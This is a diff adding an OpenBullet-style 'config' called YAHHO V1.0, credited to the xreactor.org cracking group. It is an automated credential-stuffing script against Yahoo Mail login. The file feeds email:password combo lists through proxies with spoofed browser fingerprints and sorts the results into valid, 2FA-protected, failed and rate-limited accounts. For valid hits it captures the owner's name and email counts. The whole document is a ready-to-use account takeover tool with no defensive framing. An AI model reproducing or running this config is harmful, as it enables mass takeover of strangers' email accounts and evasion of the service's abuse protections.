@@ -1,0 +1,177 @@
+[SETTINGS]
+{
+  "Name": "YAHHO V1.0 | xreactor.org",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-10T19:49:13.2083352+02:00",
+  "AdditionalInfo": "for more configs join: xreactor.org",
+  "RequiredPlugins": [],
+  "Author": "@uzzzul | @xreactor_team",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "YAHHO V1",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#@UZZZUL FUNCTION URLEncode "<USER>" -> VAR "USER" 
+
+#@UZZZUL FUNCTION URLEncode "<PASS>" -> VAR "PASS" 
+
+#@UZZZUL KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<USER>" Contains "@yahoo" 
+  KEYCHAIN Failure OR 
+    KEY "<USER>" DoesNotContain "@yahoo" 
+
+#@UZZZUL REQUEST GET "https://login.yahoo.com/" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36" 
+
+#@UZZZUL PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"crumb\" value=\"" "\"" -> VAR "CRUMB" 
+
+#@UZZZUL PARSE "<SOURCE>" LR " <input type=\"hidden\" name=\"acrumb\" value=\"" "\"" -> VAR "ACRUMB" 
+
+#@UZZZUL PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"sessionIndex\" value=\"" "\"" -> VAR "SI" 
+
+#@UZZZUL REQUEST POST "https://login.yahoo.com/" 
+  CONTENT "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A1%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A2%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Asia%2FBeirut%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A4%2C%22hash%22%3A%228a42ff740815d0498a171e59954dce6e%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20UHD%20Graphics%20600%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11-26.20.100.7926)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A48%2C%22hash%22%3A%2262d5bbf307ed9e959ad3d5ad6ccd3951%22%7D%2C%22audio%22%3A%22123.308358254224%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22728%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1644434721634%2C%22render%22%3A1644434722931%7D%7D&crumb=<CRUMB>&acrumb=<ACRUMB>&sessionIndex=<SI>&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Atrue%7D%7D&username=<USER>&passwd=&signin=Next&persistent=y" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 1528" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"location\":\"/account/challenge/password?" 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"messages.INVALID_USERNAME" 
+    KEY "errorMsg\":\"Sorry, we don't recognize this email." 
+    KEY "error\":\"messages.INVALID_IDENTIFIER" 
+    KEY "errorMsg\":\"Sorry, we don't recognize this account." 
+    KEY "{\"location\":\"/account/challenge/fail?" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "/account/challenge/push" 
+    KEY "/account/challenge/yak-code" 
+  KEYCHAIN Ban OR 
+    KEY "recaptcha" 
+
+#@UZZZUL REQUEST POST "https://login.yahoo.com/account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=<SI>&acrumb=<ACRUMB>&display=login&authMechanism=primary" 
+  CONTENT "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A1%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A2%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Asia%2FBeirut%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A4%2C%22hash%22%3A%228a42ff740815d0498a171e59954dce6e%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google+Inc.+%28Intel%29%7EANGLE+%28Intel%2C+Intel%28R%29+UHD+Graphics+600+Direct3D11+vs_5_0+ps_5_0%2C+D3D11-26.20.100.7926%29%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A48%2C%22hash%22%3A%2262d5bbf307ed9e959ad3d5ad6ccd3951%22%7D%2C%22audio%22%3A%22123.308358254224%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22728%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1644435343282%2C%22render%22%3A1644435344500%7D%7D&crumb=<CRUMB>&acrumb=<ACRUMB>&sessionIndex=<SI>&displayName=<USER>&username=<USER>&passwordContext=normal&isShowButtonClicked=&showButtonStatus=&prefersReducedMotion=&password=<PASS>&verifyPassword=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 1560" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=<SI>acrumb=<ACRUMB>&display=login&authMechanism=primary" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS(*)>" Contains "https://guce.yahoo.com/consent?" 
+    KEY "Found. Redirecting to <a href=\"https://guce.yahoo.com/consent?" 
+  KEYCHAIN Failure OR 
+    KEY "<HEADERS(*)>" Contains "/account/challenge/password?" 
+    KEY "Found. Redirecting to <a href=\"/account/challenge/password?" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Found. Redirecting to <a href=\"/account/challenge/challenge-selector?" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "rate limited" 
+
+#@UZZZUL PARSE "<SOURCE>" LR "class=\"_yb_1kk6z _yb_1wa8h _yb_1x7xs\">" "</" CreateEmpty=FALSE -> CAP "Name" "Name= " "" 
+
+#@UZZZUL PARSE "<SOURCE>" LR "total-count=\"" "\"" CreateEmpty=FALSE -> CAP "Emails" "total-mails= " "" 
+
+#@UZZZUL PARSE "<SOURCE>" LR "unread-count=\"" "\"" CreateEmpty=FALSE -> CAP "Emails-unread" "unread-mails= " "" 
+
+#@UZZZUL KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<S>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "<S>" 
+
+#@UZZZUL FUNCTION Constant "@uzzzul | @xreactor_team" -> CAP "configby" 
+
